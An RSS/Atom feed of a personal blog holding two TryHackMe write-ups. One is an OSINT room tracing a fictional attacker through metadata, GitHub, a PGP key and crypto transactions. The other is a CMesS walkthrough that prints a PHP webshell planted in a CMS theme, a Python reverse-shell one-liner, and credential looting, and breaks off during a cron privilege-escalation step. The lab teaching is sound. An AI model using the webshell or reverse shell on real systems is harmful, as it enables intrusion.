<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://rbbck.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://rbbck.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-07-03T07:47:15+00:00</updated><id>https://rbbck.github.io/feed.xml</id><title type="html">Rubick Blog</title><subtitle>Rubick Blog</subtitle><author><name>Rubick</name></author><entry xml:lang="en"><title type="html">TryHackMe Sakura Room</title><link href="https://rbbck.github.io/writeup/2022/06/24/thm_sakura_room/" rel="alternate" type="text/html" title="TryHackMe Sakura Room" /><published>2022-06-24T00:00:00+00:00</published><updated>2022-06-24T00:00:00+00:00</updated><id>https://rbbck.github.io/writeup/2022/06/24/thm_sakura_room</id><content type="html" xml:base="https://rbbck.github.io/writeup/2022/06/24/thm_sakura_room/"><![CDATA[<p><img src="/assets/Pasted image 20220627235902.png" alt="" /></p>

<h1 id="first-steps">First steps</h1>
<p>This room is designed to test a variety of <strong>OSINT</strong><sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> techniques, we are going to experience an example of <strong>investigation</strong> that aims to <strong>find some identifiers</strong> and other <strong>pieces of information</strong> in order to catch a cybercriminal.</p>

<blockquote>
  <p>NOTE: All answers can be obtained via passive OSINT techniques, DO NOT attempt any active techniques such as reaching out to account owners, password resets, etc to solve these challenges.</p>
</blockquote>

<p>We are also warned that no <strong>active OSINT</strong> will be required. See below <strong>some</strong> examples to distinguish:</p>

<table>
  <thead>
    <tr>
      <th>Passive OSINT</th>
      <th>Active OSINT</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>No direct contact</td>
      <td>Contact may occur</td>
    </tr>
    <tr>
      <td>Passive scanning, more hidden</td>
      <td>More aggressive and intrusive posture, higher risk of detection</td>
    </tr>
    <tr>
      <td>Gathering available information hosted on third parties</td>
      <td>Social engineering, e.g. sending a malicious link to the victim</td>
    </tr>
  </tbody>
</table>

<hr />

<h1 id="first-flag">First flag</h1>
<blockquote>
  <p>What username does the attacker go by?</p>
</blockquote>

<p>We are asked for the criminal’s <strong>username</strong>. In addition, an overview is provided:</p>
<blockquote>
  <p>The <a href="https://www.osintdojo.com">OSINT Dojo</a> was the victim of a cyberattack and during forensic analysis, an image left behind by the hacker was found. Perhaps it contains some clues that would allow us to point a direction?</p>
</blockquote>

<p><img src="/assets/Pasted image 20220628011354.png" alt="" /></p>

<p>With this we have our starting point. In an image there can be a lot of hidden information, either because <a href="https://en.wikipedia.org/wiki/Steganography">someone hid it</a> there, or, as in our case, because someone <strong>forgot to check its own track</strong>. The <strong><em>Exchangeable image file format</em></strong> or simply <strong>EXIF</strong> is a <strong>standard for storing information in digital photography</strong>. In short, it is a set of information about (and contained in) an image, such as its <strong>resolution</strong>, <strong>modification date</strong>, <strong>camera manufacturer</strong>, etc. In some cases it may even contain <strong>geolocation</strong> data.</p>

<p>We will use the [ExifTool] tool (https://exiftool.org/), which is used to read, write and edit <strong>metadata</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool sakurapwnedletter.svg
ExifTool Version Number         : 12.42  
File Name                       : sakurapwnedletter.svg  
Directory                       : .  
File Size                       : 850 kB  
File Modification Date/Time     : 2022:06:28 01:28:26-03:00  
File Access Date/Time           : 2022:06:28 01:28:26-03:00  
File Inode Change Date/Time     : 2022:06:28 01:28:26-03:00  
File Permissions                : -rw-r--r--  
File Type                       : SVG  
File Type Extension             : svg  
MIME Type                       : image/svg+xml  
Xmlns                           : http://www.w3.org/2000/svg  
Image Width                     : 116.29175mm  
Image Height                    : 174.61578mm  
View Box                        : 0 0 116.29175 174.61578  
SVG Version                     : 1.1  
ID                              : svg8  
Version                         : 0.92.5 (2060ec1f9f, 2020-04-08)  
Docname                         : pwnedletter.svg  
Export-filename                 : /home/SakuraSnowAngelAiko/Desktop/pwnedletter.png  
Export-xdpi                     : 96  
Export-ydpi                     : 96  
Metadata ID                     : metadata5  
Work Format                     : image/svg+xml  
Work Type                       : http://purl.org/dc/dcmitype/StillImage  
Work Title                      :
</code></pre></div></div>

<p>We have numerous outputs here, but let’s focus on a specific one. <strong>Export-filename</strong> takes as its value the path of the file at the time of export:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Export-filename                 : /home/SakuraSnowAngelAiko/Desktop/pwnedletter.png
</code></pre></div></div>
<p>And with that we find out the username of our attacker.</p>

<hr />

<h1 id="second-flag">Second flag</h1>
<blockquote>
  <p>What is the full email address used by the attacker?</p>
</blockquote>

<p>For the attacker’s <strong>email</strong>, it is either valid to use an automated tool or to go directly to the best known websites and social networks and enter the username we found before, i.e. a <strong>manual approach</strong>.</p>

<p>A <strong>very good tool</strong> is <a href="https://github.com/sherlock-project/sherlock">Sherlock</a>, written in <strong>Python</strong>, that provided a username, the software will go after it through locations on the internet.</p>

<p>Example usage:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 sherlock.py --verbose SakuraSnowAngelAiko

[*] Checking username SakuraSnowAngelAiko on:  
  
  
[+] [5058ms] GitHub: https://www.github.com/SakuraSnowAngelAiko  
[+] [11563ms] Reddit: https://www.reddit.com/user/SakuraSnowAngelAiko
[...]
</code></pre></div></div>

<p>One of the outputs is his <strong>GitHub</strong>, which is of great interest to us:</p>

<p><img src="/assets/Pasted image 20220628232728.png" alt="" /></p>

<p>These are the <strong>fixed repositories</strong> of our attacker:</p>

<p><img src="/assets/Pasted image 20220628233553.png" alt="" /></p>

<p>A special highlight is the <strong>PGP</strong><sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> repository, where the attacker shares his <strong>public key</strong><sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>.</p>

<p><img src="/assets/Pasted image 20220629014758.png" alt="" /></p>

<p>If we download the key, run <a href="https://gnupg.org/">gnu</a> <strong>without providing any parameters</strong>, passing the <strong>publickey we downloaded</strong>, the program will <strong>print</strong> the key:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/sakurasnowangelaiko/PGP/blob/main/publickey
gpg publickey

gpg: WARNING: no command supplied.  Trying to guess what you mean ...  
pub   rsa3072 2021-01-23 [SC] [expires: 2023-01-22]  
     A6519F273BF88E9126B0F4C5ECDD0FD294110450  
uid           SakuraSnowAngel83@protonmail.com  
sub   rsa3072 2021-01-23 [E] [expires: 2023-01-22]
</code></pre></div></div>

<p>Revealing the <strong>email of our cyberpirate</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid           SakuraSnowAngel83@protonmail.com  
</code></pre></div></div>

<hr />

<h1 id="third-flag">Third flag</h1>
<blockquote>
  <p>What is the attacker’s full real name?</p>
</blockquote>

<p>That was easy peasy! Putting the <strong>nickname</strong> of GitHub into Google, <strong>our first result already gives us the answer</strong>, <strong>it’s name</strong>:</p>

<p><img src="/assets/Pasted image 20220629030444.png" alt="" /></p>

<p><img src="/assets/Pasted image 20220629030620.png" alt="" /></p>

<hr />

<h1 id="fourth-flag">Fourth flag</h1>
<blockquote>
  <p>What cryptocurrency does the attacker own a cryptocurrency wallet for?</p>
</blockquote>

<p>Our goal now is to find out what <strong>cryptocurrency</strong> Aiko exchanges. Do you remember the repositories of our software engineer?</p>

<p>If you notice, the fixed ones add up to only <strong>five</strong>, when in reality he has <strong>nine</strong>:</p>

<p><img src="/assets/Pasted image 20220629032530.png" alt="" /></p>

<p>One of them being called “ETH”, an acronym for “<a href="https://ethereum.org/en/">Ethereum</a>”, one of the most famous <strong>cryptos</strong>:</p>

<p><img src="/assets/Pasted image 20220629032858.png" alt="" /></p>

<p>Entering <strong>ETH</strong> into TryHackMe, the answer was accepted, however, other repositories may indicate that it would also use <strong>Litecoin</strong> and <strong>Bitcoin</strong>.</p>

<hr />

<h1 id="fifth-flag">Fifth flag</h1>
<blockquote>
  <p>What is the attacker’s cryptocurrency wallet address?</p>
</blockquote>

<p>To find the <strong>wallet address</strong> of the hacker, we will need to go back in time.
But don’t worry, we won’t need the DeLorean!</p>

<p>Take a look at the <strong>ETH</strong> repository page:</p>

<p><img src="/assets/Pasted image 20220629033224.png" alt="" /></p>

<p>You notice that <strong>two commits</strong> have been made. Let’s see what has changed? By clicking on the little clock we see:</p>

<p><img src="/assets/Pasted image 20220629033630.png" alt="" /></p>

<p>And when you click to see the commit “Update miningscript”:</p>

<p><img src="/assets/Pasted image 20220629033717.png" alt="" /></p>

<p>That’s right! The <strong>address of it’s digital wallet</strong> being hidden.</p>

<hr />

<h1 id="sixth-flag">Sixth flag</h1>
<blockquote>
  <p>What mining pool did the attacker receive payments from on January 23, 2021 UTC?</p>
</blockquote>

<p>Inserting our previous <strong>flag</strong> into <a href="https://etherscan.io/">Etherscan</a>:</p>

<p><img src="/assets/Pasted image 20220629034349.png" alt="" /></p>

<p>We found out that the wallet does in fact exist:</p>

<p><img src="/assets/Pasted image 20220629034431.png" alt="" /></p>

<p>Now we just need to go to the <strong>transactions</strong> and look for <strong>who made payments</strong> to this destination <strong>on January 23, 2021</strong> as the flag calls for:</p>

<p><img src="/assets/Pasted image 20220629034918.png" alt="" />
We have unraveled yet another one! The sender of this transaction was “<strong>Ethermine</strong>”.</p>

<hr />

<h1 id="seventh-flag">Seventh flag</h1>
<blockquote>
  <p>What other cryptocurrency did the attacker exchange with using their cryptocurrency wallet?</p>
</blockquote>

<p>What other <strong>cryptocurrency</strong> did our target use?
Still on the transactions page we find this answer:</p>

<p><img src="/assets/Pasted image 20220629040200.png" alt="" /></p>

<p><strong>Tether</strong>! A <strong>cryptocurrency</strong> that aims to have a 1:1 quotation ratio with the <strong>US dollar</strong></p>

<h1 id="eighth-flag">Eighth flag</h1>
<blockquote>
  <p>What is the attacker’s current Twitter handle?</p>
</blockquote>

<p>To find the Twitter <em>username</em> of our attacker, the following information is provided:</p>

<blockquote>
  <p>Just as we thought, the cybercriminal is fully aware that we are gathering information about them after their attack. They were even so brazen as to message the OSINT Dojo on Twitter and taunt us for our efforts. The Twitter account which they used appears to use a different username than what we were previously tracking, maybe there is some additional information we can locate to get an idea of where they are heading to next?</p>
</blockquote>

<p><img src="https://raw.githubusercontent.com/OsintDojo/public/main/taunt.png" alt="" /></p>

<p>Searching this new username in any search engine should return the account
<strong>@SakuraLoverAiko</strong></p>

<p>In that account, there is a tweet saying “Hi! I am <strong>@AikoAbe3!</strong>”</p>

<p><img src="/assets/Pasted image 20220630212419.png" alt="" /></p>

<hr />

<h1 id="ninth-flag">Ninth flag</h1>
<blockquote>
  <p>What is the URL for the location where the attacker saved their WiFi  SSIDs and passwords?</p>
</blockquote>

<p>This flag I admit I found unexpected but interesting.
By analyzing the last Twitter account we found, we are able to find a <strong>not at all suspicious</strong> tweet:</p>

<p><img src="/assets/Pasted image 20220630212522.png" alt="" /></p>

<p>Okay dokey. So we know that our attacker (for some reason) <strong>posted their WiFi access passwords somewhere</strong>.
Another point that makes it a lot easier for us is that the <strong>ID of the post is complete</strong>. All that’s left is to know <strong>where</strong> this list was hosted.</p>

<p>Right after this tweet, Aiko replies:</p>

<p><img src="/assets/Pasted image 20220630213801.png" alt="" /></p>

<p>The tweet quotes “<strong>Dark Web</strong>” and “<strong>Deep Paste</strong>” (in capital letters, it looks comical). So we know that our site is on the <a href="https://www.torproject.org/">Onion network</a>. 
The question here becomes now <strong>HOW</strong> to find this address, considering that to <strong>index</strong> pages on these alternative networks always requires some effort.</p>

<p>If you find (for instance, on Google or DuckDuckGo) any site that lists famous .onion addresses, finding DeepPaste’s address becomes easy (<a href="https://support.torproject.org/onionservices/v2-deprecation/">the v3 address</a>).</p>

<blockquote>
  <p>Deep Paste may be offline at the time you are working on this room. For this reason, TryHackMe provides the address in the hint</p>
</blockquote>

<p><img src="/assets/Pasted image 20220701192938.png" alt="" /></p>

<p>Once you find it, just enter the ID of the post in the search field and the page will show up. In it some <strong>SSIDs</strong> and some <strong>passwords</strong> have been stored.</p>

<p><img src="/assets/Pasted image 20220701193518.png" alt="" /></p>

<hr />

<h1 id="tenth-flag">Tenth flag</h1>

<blockquote>
  <p>What is the BSSID for the attacker’s Home WiFi?</p>
</blockquote>

<p>To find the BSSID<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup>, you will need an account at <a href="https://wigle.net/">wigle</a> to use the advanced search function.</p>

<p>With a simple search, we only get a sense of the geolocation of the BSSID, not its identifier:</p>

<p><img src="/assets/Pasted image 20220703005717.png" alt="" /></p>

<p>Now with advanced search:</p>

<p><img src="/assets/Pasted image 20220703010734.png" alt="" /></p>

<p><img src="/assets/Pasted image 20220703010722.png" alt="" /></p>

<hr />

<h1 id="tenth-flag-1">Tenth flag</h1>

<blockquote>
  <p>What airport is closest to the location the attacker shared a photo from prior to getting on their flight?</p>
</blockquote>

<p>Taking a look at his Twitter, we found this:</p>

<p><img src="/assets/Pasted image 20220701194313.png" alt="" /></p>

<p>So far, I admit not being good at <strong>IMINT</strong><sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">5</a></sup>, I got caught up in this part, which motivated me to want to do the <a href="https://tryhackme.com/room/searchlightosint">Searchlight - IMINT room</a>, learn and explore more of this area. I didn’t know any tools either, so I had to rely on the help of others. However, I will try to illustrate it in a way that we can all <strong>learn!</strong>.</p>

<p>In the image you can see an <strong>obelisk</strong> faaar awaay in the center of the image:</p>

<p><img src="/assets/Pasted image 20220703012352.png" alt="" /></p>

<p>I imagine that for those living at US it is something very identifiable just by looking at it, but for me it was impossible. I spent about half an hour looking for places near the coast of Japan, still not having made the connection that our invader was traveling not through Japanese lands, but in <strong>another country</strong>.</p>

<p>The obelisk is the <strong>Washington Monument</strong>:</p>

<p><img src="/assets/Pasted image 20220703012933.png" alt="" /></p>

<p>Then we look for airports that are close to the monument:</p>

<p><img src="/assets/Pasted image 20220703020423.png" alt="" /></p>

<p>The closest one is Ronald Reagan Washington National Airport. The format of this flag is three characters, so the one used here will be the airport code.</p>

<p><img src="/assets/Pasted image 20220703020833.png" alt="" /></p>

<hr />

<h1 id="eleventh-flag">Eleventh flag</h1>

<blockquote>
  <p>What airport did the attacker have their last layover in?</p>
</blockquote>

<p><img src="/assets/Pasted image 20220703021109.png" alt="" /></p>

<p>Reverse image search:</p>

<p><img src="/assets/Pasted image 20220703021723.png" alt="" /></p>

<p>We see already in the second result “<strong>Tokyo International Airport [Haneda]</strong>”.</p>

<p>And then just go after the 3-digit code:</p>

<p><img src="/assets/Pasted image 20220703022808.png" alt="" /></p>

<hr />

<h1 id="twelfth-flag">Twelfth flag</h1>
<blockquote>
  <p>What lake can be seen in the map shared by the attacker as they were on their final flight home?</p>
</blockquote>

<p>Also from Twitter:</p>

<p><img src="/assets/Pasted image 20220703022955.png" alt="" /></p>

<p>Just use a map and go for it, it is quite easy to find the place in Japan if you orient yourself by the islands to the northwest. We can easily get this one, since it is right under our noses:</p>

<p><img src="/assets/Pasted image 20220703023300.png" alt="" /></p>

<p><img src="/assets/Pasted image 20220703023357.png" alt="" /></p>

<p><img src="/assets/Pasted image 20220703023333.png" alt="" /></p>

<h1 id="thirteenth-flag">Thirteenth flag</h1>
<blockquote>
  <p>What city does the attacker likely consider “home”?</p>
</blockquote>

<p><strong>Two</strong> ways are possible to getting this flag:</p>
<ul>
  <li>See in <strong>which city</strong> that <strong>BSSID we put in the Wigle earlier</strong> is in</li>
  <li>Use the <strong>BSSID</strong> of <strong>Aiko’s city WiFi</strong> from the Deep Paste</li>
</ul>

<hr />

<h1 id="footnotes">Footnotes</h1>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Open Source Intelligence <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>Pretty Good Privacy <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>Read about <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key criptography</a>. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
      <p>Basic Service Set Identifier; It usually refers to the MAC address, that is, a unique identifier of an adapter or an access point. Or it will be a derivation of it. Reference: https:/<a href="https://www.quora.com/What-is-the-difference-between-SSID-BSSID-and-MAC-addresses">/www.quora.com/What-is-the-difference-between-SSID-BSSID-and-MAC-addresses</a> <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:5" role="doc-endnote">
      <p><a href="https://en.wikipedia.org/wiki/Imagery_intelligence">Imagery Intelligence</a> <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>]]></content><author><name>Rubick</name></author><category term="writeup" /><summary type="html"><![CDATA[]]></summary></entry><entry xml:lang="en"><title type="html">TryHackMe CMesS</title><link href="https://rbbck.github.io/writeup/2022/05/20/thm_cmess/" rel="alternate" type="text/html" title="TryHackMe CMesS" /><published>2022-05-20T00:00:00+00:00</published><updated>2022-05-20T00:00:00+00:00</updated><id>https://rbbck.github.io/writeup/2022/05/20/thm_cmess</id><content type="html" xml:base="https://rbbck.github.io/writeup/2022/05/20/thm_cmess/"><![CDATA[<p><img src="https://user-images.githubusercontent.com/77530544/171437979-f426c564-871e-40fd-bd56-910690e688b6.png" alt="Pasted image 20220601071802" /></p>

<h1 id="first-steps">First steps</h1>
<p>We are asked to add the <strong>MACHINE_IP cmess.thm</strong> to our <strong>/etc/hosts</strong> file:</p>

<blockquote>
  <p>Please add <code class="language-plaintext highlighter-rouge">MACHINE_IP cmess.thm</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
Please also note that this box does not require brute forcing!</p>
</blockquote>

<p>Once this is added, it’s time to run the <strong>Nmap</strong> for recon:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sC -sV cmess.thm                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 07:48 -03  
Nmap scan report for cmess.thm (10.10.215.52)  
Host is up (0.22s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)  
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)  
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)  
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
| http-robots.txt: 3 disallowed entries    
|_/src/ /themes/ /lib/  
|_http-generator: Gila CMS  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
</code></pre></div></div>

<p>We discovered two services, a <strong>SSH on port 22</strong> and an <strong>Apache server on port 80</strong> with <a href="https://gilacms.com/">Gila CMS</a>.</p>

<p>Upon visiting the <strong>cmess.thm</strong> address we are greeted with the page:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171438994-b5cfac57-add4-4fb1-a8ad-1931043a18c7.png" alt="Pasted image 20220601075329" /></p>

<hr />

<h1 id="first-flag">First flag</h1>
<blockquote>
  <p>Compromise this machine and obtain <code class="language-plaintext highlighter-rouge">user.txt</code>. <br />
<code class="language-plaintext highlighter-rouge">Hint:</code> Have you tried fuzzing for subdomains?</p>
</blockquote>

<p>This hint is a great starting point. From here, we are going to do some <strong>fuzzing after subdirectories</strong>, and then for <strong>subdomains</strong>.</p>

<p>We will use <a href="https://github.com/3ndG4me/KaliLists/blob/master/dirb/small.txt">this wordlist</a> for testing with the <a href="https://github.com/xmendez/wfuzz">wfuzz</a> tool.</p>

<h3 id="fuzzing-of-subdirectories">Fuzzing of subdirectories</h3>
<p>With the parameters:</p>
<ul>
  <li><strong>-w</strong> - wordlist</li>
  <li><strong>-u</strong> - as we are now after subdirectories, the word “FUZZ” that tells the software where to insert the text, it will be at the end of the address</li>
  <li><strong>-c</strong> - output with colors</li>
  <li><strong>–sc 200</strong> - option to only show the results of <strong>HTTP 200 status codes</strong></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w wordlist.txt -u http://cmess.thm/FUZZ -c --sc 200                                                                   
********************************************************  
* Wfuzz 3.1.0 - The Web Fuzzer  
********************************************************  
  
Target: http://cmess.thm/FUZZ  
Total requests: 959  
  
=====================================================================  
ID Response Lines Word Chars Payload                                                                                                 
=====================================================================  
  
000000006: 200 102 L 308 W 4078 Ch "1"                                                                                                     
000000001: 200 107 L 290 W 3851 Ch "0"                                                                                                     
000000003: 200 102 L 308 W 4078 Ch "01"                                                                                                    
000000049: 200 92 L 266 W 3353 Ch "about"                                                                                                 
000000059: 200 41 L 99 W 1580 Ch "admin"                                                                                                 
000000083: 200 0 L 0 W 0 Ch "api"                                                                                                   
000000133: 200 107 L 290 W 3851 Ch "blog"                                                                                                  
000000434: 200 107 L 290 W 3851 Ch "index"                                                                                                 
000000498: 200 41 L 99 W 1580 Ch "login"                                                                                                 
000000722: 200 107 L 290 W 3851 Ch "search                                                                                                
000000818: 200 109 L 292 W 3874 Ch "tag"                                                                                                   
  
Total time: 21.13536  
Processed Requests: 959  
Filtered Requests: 948  
Requests/sec: 45.37419
</code></pre></div></div>

<p>With this result we can highlight <strong>login</strong> and <strong>admin</strong>.</p>

<p>When visiting cmess.thm/login:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439377-edc7256b-b905-4868-abb9-8abbbeca65b2.png" alt="Pasted image 20220601085847" /></p>

<p>About the <strong>admin</strong> page, since we are not logged in, the website returns us to the login page.</p>

<h3 id="fuzzing-of-subdomains">Fuzzing of subdomains:</h3>
<p>Regarding <strong>parameters</strong>:</p>
<ul>
  <li><strong>-u</strong> - as we are now after subdomains, the word “FUZZ” that tells the software where to insert the text will be gone as we will define this in another parameter</li>
  <li><strong>-H “Host: FUZZ.cmess.thm “</strong> - specifying that the fuzzing will be at the beginning of the address, looking for subdomains</li>
  <li><strong>–hw 290</strong> - clean up the output, hiding false positives, because depending on how the website is set up, the page will return a 200 code, but will only show a “Not Found” error</li>
  <li><strong>–hc 400</strong> - also to clean up the output, hiding “Bad Request” errors</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -w wordlist.txt -H "Host: FUZZ.cmess.thm" -u http://cmess.thm/ -c --hw 290 --hc 400 

********************************************************  
* Wfuzz 3.1.0 - The Web Fuzzer  
********************************************************  
  
Target: http://cmess.thm/  
Total requests: 959  
=====================================================================  
ID Response Lines Word Chars Payload                                                                                                 
=====================================================================  
  
000000270: 200 30 L 104 W 934 Ch "dev"                                                                                                   
  
Total time: 21.96167  
Processed Requests: 959  
Filtered Requests: 958  
Requests/sec: 43.66697
</code></pre></div></div>

<p>The output tells us that there is a <strong>dev.cmess.thm</strong>, which we will add to our <strong>/etc/hosts</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.215.52 cmess.thm dev.cmess.thm
</code></pre></div></div>

<p>Visiting the address, we see a log with exposed credentials:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439403-c0bd8957-7c1f-4b35-a477-d25a12c73c76.png" alt="Pasted image 20220601092555" /></p>

<p>Logging in:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439418-ddf03baf-9cd4-4823-af0e-946d09154ba0.png" alt="Pasted image 20220601092834" /></p>

<p>We now have access to the <strong>admin</strong> page:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439487-a50b88ec-319c-48d9-9e2a-182efb121d6e.png" alt="Pasted image 20220601092914" /></p>

<p>With this we get the <strong>Gila CMS</strong> version: 1.10.9
We got access to an admin panel, with even a File Manager with file <strong>addition</strong>, <strong>removal</strong> and <strong>update</strong>:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439692-5778287d-fc1d-4c79-8f74-a2f8fb19dd8e.png" alt="Pasted image 20220601093523" />
<img src="https://user-images.githubusercontent.com/77530544/171439723-f4b9376a-1d7a-48ec-9240-647f39d01e6b.png" alt="Pasted image 20220601093640" /></p>

<p>We will modify the <strong>/themes/gila-blog/header.php</strong> file in order to get a <strong>reverse shell</strong> through a <strong>webshell</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
&lt;?php
system($_GET["cmd"]); # Return web shell that accepts input
view::stylesheet('lib/gila.min.css');
view::stylesheet('lib/font-awesome/css/font-awesome.min.css');
view::head()?&gt;
&lt;style&gt;
[...]
</code></pre></div></div>

<p>Time to test the <strong>webshell</strong>, for that we go to <strong>cmess.thm</strong> and at the end of the address we will add “<strong>?cmd=ls</strong>”, to run the <strong>ls</strong> command on that <strong>webshell</strong>, which will return us a directory listing, right at the beginning of the page:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439769-64cffdd3-d820-4aef-bb7a-12fefc9d4fa7.png" alt="Pasted image 20220601095445" /></p>

<p>I decided to use <strong>Python</strong> to get this <strong>reverse shell</strong>, so for that let’s find out what version we have installed on our target running <strong>“?cmd=Python3 –version”</strong>:</p>

<p><img src="https://user-images.githubusercontent.com/77530544/171439809-332fb639-371a-42be-aa8d-2b4a9583c62b.png" alt="Pasted image 20220601100556" /></p>

<p>Now let’s open a <strong>listener</strong> on our machine that will wait for the connection from the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lnvvvp 6666                                                                     
Listening on any address 6666
</code></pre></div></div>

<p>The commands we are going to insert into our <strong>webshell</strong> will now be a bit more robust. <strong>Example of a Python reverse shell with one line of code</strong>:<br />
*Recommended reading: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
</code></pre></div></div>

<p>After inserting this input into the web page, on our machine we already have access to the <strong>reverse shell</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connection from 10.10.215.52:49564  
/bin/sh: 0: can't access tty; job control turned off  
$ pwd     
/var/www/html  
$ whoami  
www-data  
$
</code></pre></div></div>

<p>I uploaded https://github.com/carlospolop/PEASS-ng to a <strong>HTTP</strong> server, downloaded the <strong>linpeas.sh</strong> and granted execution permission with “<strong>chmod +x linpeas.sh</strong>”.</p>

<p>Upon executing the file, we get an output with numerous pieces of information, however, let’s emphasize two findings:</p>
<ul>
  <li><strong>/tmp/andre_backup.tar.gz</strong></li>
  <li><strong>/opt/.password.bak</strong></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Backup files (limited 100)  
-rw-r--r-- 1 root root 161 Jun 1 06:38 /tmp/andre_backup.tar.gz
[...]
-rwxrwxrwx 1 root root 36 Feb 6 2020 /opt/.password.bak
[...]
</code></pre></div></div>

<p>Password for user andre:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /opt/.password.bak  
andre backup password  
UQfsdCB7aAP6
</code></pre></div></div>

<p>Connecting via <strong>ssh</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh andre@cmess.thm  
andre@cmess.thm's password:    
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)  
  
* Documentation: https://help.ubuntu.com  
* Management: https://landscape.canonical.com  
* Support: https://ubuntu.com/advantage  
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20  
andre@cmess:~$ ls  
backup user.txt
</code></pre></div></div>

<p>Our <strong>first flag</strong> is inside the file <strong>user.txt</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~$ cat user.txt    
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
</code></pre></div></div>
<hr />

<h1 id="second-flag">Second flag</h1>
<p><em>Escalate your privileges and obtain <strong>root.txt</strong></em></p>

<p>Remember the <strong>/tmp/andre_backup.tar.gz</strong> file?
<strong>Cron</strong> is a utility in the <strong>Linux world</strong> for automating tasks, in the case of our target machine, looking at <strong>/etc/crontab</strong> we see that there is a backup of the <strong>/home/andre/backup</strong> directory being done to that file we found with <strong>linpeas.sh</strong> earlier. Here we have an example of a <strong>Wildcard Injection</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>andre@cmess:~/backup$ cat /etc/crontab  
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don't have to run the `crontab'  
# command to install the new version when you edit this file  
# and files in /etc/cron.d. These files also have username fields,  
# that none of the other crontabs do.  
  
SHELL=/bin/sh  
